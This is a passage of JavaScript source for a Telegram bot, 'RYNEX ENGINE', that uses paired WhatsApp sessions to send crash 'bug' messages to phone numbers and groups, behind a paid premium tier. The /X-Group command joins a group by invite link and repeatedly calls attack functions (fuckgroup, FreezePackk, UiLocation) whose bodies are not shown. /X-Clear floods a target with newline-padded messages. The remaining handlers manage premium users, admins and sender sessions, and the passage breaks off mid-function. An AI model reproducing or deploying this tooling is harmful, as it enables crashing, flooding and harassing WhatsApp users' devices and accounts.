  bot.sendPhoto(chatId, "https://files.catbox.moe/nqxsbz.jpg", {
    caption: `
<blockquote>RYNEX ENGINE</blockquote>
↯ Developer : @RyzenXOfficial
↯ Version   : 1.0 
↯ Platform : Telegram
↯ Type : Premium
-------------------------------------------
<blockquote>INFORMATION</blockquote>
↯ User : ${username}
↯ UserID : ${senderId}
↯ Premium Status  : ${premiumStatus}
-------------------------------------------
<blockquote>STATUS SENDER</blockquote>
↯ Connection : ${senderStatus}
-------------------------------------------
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "R-BEK", callback_data: "trashmenu",style : "Danger" },
          { text: "R-SETTING", 
   callback_data: "setting", style : "Success" },
        ],
        [
          {
  text: "R-DEVELOPER",
  url: "https://t.me/RyzenXOfficial", style : "Primary" }
        ]
      ]
    }
  });
});

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(senderId);

    let caption = "";
    let replyMarkup = {};

    // ===== BEK MENU =====
    if (query.data === "trashmenu") {
      caption = `
<blockquote>RYNEX ENGINE</blockquote>
↯ Developer : @RyzenXOfficial
↯ Version   : 1.0 
↯ Platform : Telegram
↯ Type : Premium
-------------------------------------------
<blockquote>INFORMATION</blockquote>
↯ User : ${username}
↯ UserID : ${senderId}
↯ Premium Status  : ${premiumStatus}
-------------------------------------------
<blockquote>MENU BEK</blockquote>
✯ /X-Ios
✯ /X-Combo
✯ /X-Fc
✯ /X-Clear
-------------------------------------------
`;

      replyMarkup = {
        inline_keyboard: [
          [
          { text: "R-BEK", callback_data: "trashmenu",style : "Danger" },
          { text: "R-SETTING", 
   callback_data: "setting", style : "Success" },
        ],
        [
          {
  text: "R-DEVELOPER",
  url: "https://t.me/RyzenXOfficial", style : "Primary" }
          ]
        ]
      };
    }

    // ===== SETTING =====
    else if (query.data === "setting") {
      caption = `
<blockquote>RYNEX ENGINE</blockquote>
↯ Developer : @RyzenXOfficial
↯ Version   : 1.0 
↯ Platform : Telegram
↯ Type : Premium
-------------------------------------------
<blockquote>INFORMATION</blockquote>
↯ User : ${username}
↯ UserID : ${senderId}
↯ Premium Status  : ${premiumStatus}
-------------------------------------------
<blockquote>OWNER MENU</blockquote>
✮ /setjeda (5m)
✮ /addprem (id)
✮ /delprem (id)
✮ /cekprem
✮ /addadmin (id)
✮ /reqpair 62xxx
✮ /encjava
✮ /cekidch (link)
`;

      replyMarkup = {
        inline_keyboard: [
          [
          { text: "R-BEK", callback_data: "trashmenu",style : "Danger" },
          { text: "R-SETTING", 
   callback_data: "setting", style : "Success" },
        ],
        [
          {
  text: "R-DEVELOPER",
  url: "https://t.me/RyzenXOfficial", style : "Primary" }
          ]
        ]
      };
    }

    // ===== UPDATE MESSAGE =====
    await bot.editMessageMedia({
  type: "photo",
  media: "https://files.catbox.moe/nqxsbz.jpg",
  caption: caption,
  parse_mode: "HTML"
}, {
  chat_id: chatId,
  message_id: messageId,
  reply_markup: replyMarkup
});

} catch (err) {
  const desc = err?.response?.body?.description || err?.message || "";

  if (desc.includes("message is not modified")) return;

  console.log(err);
}
});

    

//=======CASE BEK=========//



bot.onText(/\/Hello (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RyzenXOfficial" }]
        ]
      }
    });
  }

  try {
    const activeSender = getActiveSender();

    if (!activeSender) {
      return bot.sendMessage(chatId, "❌ Tiada sender WhatsApp yang aktif.");
    }

    const senderSock = activeSender.sock;
    const usedSender = activeSender.number;

    const username = msg.from.username
      ? `@${msg.from.username}`
      : msg.from.first_name;

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/w711vx.jpg", {
      caption: `
\`\`\`
⌬ MODE : BAIK

⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown"
    });

    for (let x = 1; x <= 10; x++) {
      for (let i = 0; i <= 8; i++) {
        await sleep(300);
      }

      const percent = x * 10;
      const progressBar = getProgressBar(percent);

      await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : ${progressBar}
\`\`\`
`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      });

      await sleep(700);
    }

    await senderSock.sendMessage(`${formattedNumber}@s.whatsapp.net`, {
      text: "Hello"
    });

    await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : Success
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "OPEN TARGET", url: `https://wa.me/${formattedNumber}` }
        ]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal: ${error.message}`);
  }
});

bot.onText(/\/X-Group(?:\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan BEK
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RyzenXOfficial" }]
      ]
    }
  });
}
    if (cooldown > 0) {
  return bot.sendMessage(chatId, 
`Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }


  const groupLink = match[1]?.trim();
  if (!groupLink) {
    return bot.sendMessage(
      chatId,
      "🚫 Masukin link grup yang bener!\nContoh: /O-Group https://chat.whatsapp.com/xxxx"
    );
  }

  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(
      chatId,
      "🚫 Link grup salah!\nContoh: /O-Group https://chat.whatsapp.com/xxxx"
    );
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

  try {
    await bot.sendMessage(chatId, "⏳ Sedang join grup, tunggu bentar..."); 
    
    const groupJid = await sock.groupAcceptInvite(groupCode);
    await bot.sendMessage(
      chatId,
      "✅ Berhasil join grup! Kirim BEK sekarang..."
    );
    const target = groupJid;
    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/w711vx.jpg", {
      caption: `
\`\`\`
✮ ᴄʀᴀsʜʙᴏʏ - ᴀᴛᴛᴀᴄᴋ ✮
- ᴛᴀʀɢᴇᴛ  : ${groupJid}
- sᴛᴀᴛᴜs :ᴘʀᴏᴄᴇssɪɴɢ...
\`\`\`
`, parse_mode: "Markdown"
    });
    
   
    console.log("\x1b[32m[PROCES MENGIRIM BEK]\x1b[0m TUNGGU HINGGA SELESAI");
  for (let i = 0; i <= 8; i++) {   
    await fuckgroup(target);
    await FreezePackk(target);
    await UiLocation(target, Ptcp = true);
      }
    await bot.editMessageCaption(`
\`\`\`
✮ ᴄʀᴀsʜʙᴏʏ - ᴀᴛᴛᴀᴄᴋ ✮
- ᴛᴀʀɢᴇᴛ  : ${groupJid}
- sᴛᴀᴛᴜs : sᴜᴄᴄᴇsꜰᴜʟʟʏ sᴇɴᴅ ʙᴜɢ
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂", url: `${groupJid}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim BEK: ${error.message}`);
  }
});

bot.onText(/\/Test3 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RyzenXOfficial" }]
        ]
      }
    });
  }

  try {
    const activeSender = getActiveSender();

    if (!activeSender) {
      return bot.sendMessage(chatId, "❌ Tiada sender WhatsApp yang aktif.");
    }

    const senderSock = activeSender.sock;
    const usedSender = activeSender.number;

    const username = msg.from.username
      ? `@${msg.from.username}`
      : msg.from.first_name;

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/w711vx.jpg", {
      caption: `
\`\`\`
⌬ MODE : BAIK

⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown"
    });

    for (let x = 1; x <= 10; x++) {
      for (let i = 0; i <= 8; i++) {
        await sleep(300);
      }

      const percent = x * 10;
      const progressBar = getProgressBar(percent);

      await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : ${progressBar}
\`\`\`
`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      });

      await sleep(700);
    }

    await senderSock.sendMessage(`${formattedNumber}@s.whatsapp.net`, {
      text: "Hello"
    });

    await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : Success
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "OPEN TARGET", url: `https://wa.me/${formattedNumber}` }
        ]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal: ${error.message}`);
  }
});

bot.onText(/\/Test2 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RyzenXOfficial" }]
        ]
      }
    });
  }

  try {
    const activeSender = getActiveSender();

    if (!activeSender) {
      return bot.sendMessage(chatId, "❌ Tiada sender WhatsApp yang aktif.");
    }

    const senderSock = activeSender.sock;
    const usedSender = activeSender.number;

    const username = msg.from.username
      ? `@${msg.from.username}`
      : msg.from.first_name;

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/w711vx.jpg", {
      caption: `
\`\`\`
⌬ MODE : BAIK

⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown"
    });

    for (let x = 1; x <= 10; x++) {
      for (let i = 0; i <= 8; i++) {
        await sleep(300);
      }

      const percent = x * 10;
      const progressBar = getProgressBar(percent);

      await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : ${progressBar}
\`\`\`
`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      });

      await sleep(700);
    }

    await senderSock.sendMessage(`${formattedNumber}@s.whatsapp.net`, {
      text: "Hello"
    });

    await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : Success
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "OPEN TARGET", url: `https://wa.me/${formattedNumber}` }
        ]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal: ${error.message}`);
  }
});

bot.onText(/\/Test1 (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (shouldIgnoreMessage(msg)) return;

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RyzenXOfficial" }]
        ]
      }
    });
  }

  try {
    const activeSender = getActiveSender();

    if (!activeSender) {
      return bot.sendMessage(chatId, "❌ Tiada sender WhatsApp yang aktif.");
    }

    const senderSock = activeSender.sock;
    const usedSender = activeSender.number;

    const username = msg.from.username
      ? `@${msg.from.username}`
      : msg.from.first_name;

    const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/w711vx.jpg", {
      caption: `
\`\`\`
⌬ MODE : BAIK

⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : [░░░░░░░░░░] 0%
\`\`\`
`,
      parse_mode: "Markdown"
    });

    for (let x = 1; x <= 10; x++) {
      for (let i = 0; i <= 8; i++) {
        await sleep(300);
      }

      const percent = x * 10;
      const progressBar = getProgressBar(percent);

      await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : ${progressBar}
\`\`\`
`, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      });

      await sleep(700);
    }

    await senderSock.sendMessage(`${formattedNumber}@s.whatsapp.net`, {
      text: "Hello"
    });

    await bot.editMessageCaption(`
\`\`\`
⌬ MODE : BAIK
⌬ User   : ${username}
⌬ Sender : ${usedSender}
⌬ Target : ${formattedNumber}
⌬ Type   : Test
⌬ Result : Success
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "OPEN TARGET", url: `https://wa.me/${formattedNumber}` }
        ]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal: ${error.message}`);
  }
});

bot.onText(/^\/X-Clear\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    const q = match[1]; // Ambil argumen setelah /delete-BEK
    
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan BEK
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/RyzenXOfficial" }]
      ]
    }
  });
}
    
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\n/X-Clear 62xxx`);
    }
    
    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) {
        return bot.sendMessage(chatId, `Contoh : /fixedBEK 62xxx`);
    }
    
    let target = pepec + '@s.whatsapp.net';
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { 
                text: "𝐂𝐑𝐀𝐒𝐇𝐁𝐎𝐘 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝙊𝙩𝙖𝙓𝙭𝙭 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆"
            });
        }
        bot.sendMessage(chatId, "Done Clear BEK By CrashBoy!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim BEK.");
    }
});

// case other
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//INSTALL ELYSIUM

//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in reqpair:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/^\/listsender$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "🤬 Akses Ditolak");
  }

  const activeSenders = getActiveSenders();

  if (activeSenders.length === 0) {
    return bot.sendMessage(chatId, "╭─「 LIST SENDER 」\n│ Total Aktif : 0\n│ Status : TIADA SENDER AKTIF\n╰────────────");
  }

  let text = "╭─「 LIST SENDER 」\n";
  text += `│ Total Aktif : ${activeSenders.length}\n`;
  text += "│ Status : MULTI SENDER ACTIVE\n";
  text += "├────────────\n";

  activeSenders.forEach(([number], index) => {
    text += `│ ${index + 1}. ${number} 🟢 ONLINE\n`;
  });

  text += "╰────────────";

  bot.sendMessage(chatId, text);
});

bot.onText(/^\/statussender$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "🤬 Akses Ditolak");
  }

  const savedSenders = readSavedSenders();

  if (savedSenders.length === 0) {
    return bot.sendMessage(chatId, "╭─「 STATUS SENDER 」\n│ Total Pernah Terhubung : 0\n│ Data kosong\n╰────────────");
  }

  let text = "╭─「 STATUS SENDER 」\n";
  text += `│ Total Pernah Terhubung : ${savedSenders.length}\n`;
  text += "├────────────\n";

  savedSenders.forEach((number, index) => {
    const senderSock = sessions.get(String(number));
    const online =
      senderSock &&
      senderSock.user &&
      senderSock.ws &&
      senderSock.ws.readyState === 1;

    text += `│ ${index + 1}. ${number} ${online ? "🟢 ONLINE" : "🔴 OFFLINE"}\n`;
  });

  text += "╰────────────";

  bot.sendMessage(chatId, text);
});

bot.onText(/^\/delsender\s+(\d+)$/, async (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "🤬 Akses Ditolak");
  }

  const number = String(match[1]).replace(/[^0-9]/g, "");

  if (!number) {
    return bot.sendMessage(chatId, "Contoh: /delsender 628xxxx");
  }

  try {
    removeSender(number);
    bot.sendMessage(chatId, `✅ Sender ${number} berjaya dibuang.`);
  } catch {
    bot.sendMessage(chatId, `❌ Gagal buang sender ${number}.`);
  }
});

bot.onText(/^\/refresh$/, async (msg) => {
  const chatId = msg.chat.id;

  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendMessage(chatId, "🤬 Akses Ditolak");
  }

  const savedSenders = readSavedSenders();

  if (savedSenders.length === 0) {
    return bot.sendMessage(chatId, "❌ Tiada sender tersimpan untuk refresh.");
  }

  await bot.sendMessage(chatId, "🔄 Refresh sender sedang berjalan...");

  for (const botNumber of savedSenders) {
    try {
      const number = String(botNumber);
      const alreadyActive = sessions.get(number);

      if (
        alreadyActive &&
        alreadyActive.user &&
        alreadyActive.ws &&
        alreadyActive.ws.readyState === 1
      ) {
        continue;
      }

      const sessionDir = createSessionDir(number);
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

      const newSock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: P({ level: "silent" }),
        defaultQueryTimeoutMs: undefined,
      });

      newSock.ev.on("creds.update", saveCreds);

      newSock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === "open") {
          sessions.set(number, newSock);
        }

        if (connection === "close") {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

          sessions.delete(number);

          if (!shouldReconnect) {
            removeSender(number);
          }
        }
      });

    } catch {}
  }

  setTimeout(() => {
    const activeSenders = getActiveSenders();

    let text = "╭─「 REFRESH SENDER 」\n";
    text += `│ Total Aktif : ${activeSenders.length}\n`;
    text += "├────────────\n";

    if (activeSenders.length === 0) {
      text += "│ Tiada sender aktif\n";
    } else {
      activeSenders.forEach(([number], index) => {
        text += `│ ${index + 1}. ${number} 🟢 ONLINE\n`;
      });
    }

    text += "╰────────────";

    bot.sendMessage(chatId, text);
  }, 5000);
});

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "🙈 Et Dah lu Siapa ?... Emang Gw kenal?.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🙈 You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

